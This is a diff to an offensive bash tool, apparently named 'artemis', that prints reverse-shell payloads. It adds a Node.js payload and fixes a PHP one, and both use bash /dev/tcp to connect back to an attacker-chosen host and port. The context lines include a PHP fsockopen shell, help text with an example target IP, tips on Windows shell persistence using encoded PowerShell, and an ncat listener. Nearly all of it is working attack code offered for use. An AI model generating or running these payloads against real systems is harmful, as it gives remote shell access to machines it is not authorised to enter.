@@ -13,7 +13,8 @@ Help()
 	echo -e "-t <Target_OS>: Specify the target OS for Web shell payloads & for stabilization tips [win/nix]\n\n"
 	echo -e "-s <Payload_Type>: Specify the type of Reverse shell to generate (Refer to the Payloads section for a list of accepted arguments)\n$line"
 	echo -e "[Example Syntax]\n\nReverse Shell: artemis -i 10.10.144.68 -p 443 -s ps -t nix -l\n\nAD Pivoting: artemis -a\n$line"	
-	echo -e "Payloads:\n\n[ps] Powershell\n[bash]\n[nc] Netcat (*nix targets)\n[java]\n[py] Python (*nix targets)\n[php] (*nix targets)\n\n"
+	echo -e "Payloads:\n\n[ps] Powershell\n[bash]\n[nc] Netcat (*nix targets)\n[java]\n[py] Python (*nix targets)\n[php] (*nix targets)"
+	echo -e "[node] Node.js (*nix targets)\n\n"
 	echo -e "[!] Tip: If you're having trouble catching a shell, try the following steps-\n\n1) Double check your firewall settings & verify target's IP Address\n"
 	echo -e "2) Instead of getting a Reverse Shell, start capturing ICMP packets and use a payload to make the target ping you a few times\n"
 	echo -e "3) Use common ports for your Reverse shell (e.g. 80 or 443) or try ports that hosts in your target's LAN are using\n"
@@ -126,6 +127,9 @@ else
 	elif [ "$shell" == "php" ]
 	then
 		mode=6
+	elif [ "$shell" == "node" ]
+	then
+		mode=7
 	else
 		echo -e "\nError: Invalid payload selected\nView the help menu with: artemis -h\n"
 		exit
@@ -213,7 +217,13 @@ then
 
 	echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 	echo -e "\n\nAlternate Payload (PHP tags):\n"
-	echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/\"$host\"/$port 0>&1'\");?>"
+	echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\");?>"
+
+elif [ $mode == 7 ]
+then
+	echo -e "\nOutputting Node.js Payload for $host:$port\n\n"
+	echo "require('child_process').exec('bash -i >& /dev/tcp/$host/$port 0>&1');"
+
 else
 	echo -e "\nYou did not select a valid option\n"
 	exit
@@ -266,8 +276,8 @@ then
 	echo -e "\n\n{Manually Stabilizing a Windows Shell}\n"
 	echo -e "Use this shell to create a \"Backup Shell\" that you'll use. It may be more stable, but it's mainly in case you cause the shell to freeze while using it.\n\nSetup:\n"
 	echo "1) Navigate to a Writable Directory:"; echo "cd \users\public"
-	echo -e "\n2) Create a file with your payload:\nWrite-Output \"PAYLOAD\" > shell.ps1\n\nMethods:\n"
-	echo "1) Process: (Try with and without \"-NoNewWindow\")"; echo "Start-Process -NoNewWindow .\shell.ps1"
+	echo -e "\n2) Create a file with your payload [May be bad advice. These may want an EXE, like the Process command]:\nWrite-Output \"PAYLOAD\" > shell.ps1\n\nMethods:\n"
+	echo "1) Process: (Try with and without \"-NoNewWindow\")"; echo "Start-Process -FilePath \"powershell\" -ArgumentList \"-enc ENCODED\""
 	echo -e "\n2) Job:"; echo "Start-Job .\shell.ps1"
 	echo -e "\n3) Run in foreground:\n"; echo "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe \Users\Public\shell.ps1"
 
@@ -293,5 +303,5 @@ fi
 
 if [ $listen == 1 ]
 then
-	sudo rlwrap ncat -lvnp $port
+	rlwrap ncat -lvnp $port
 fi
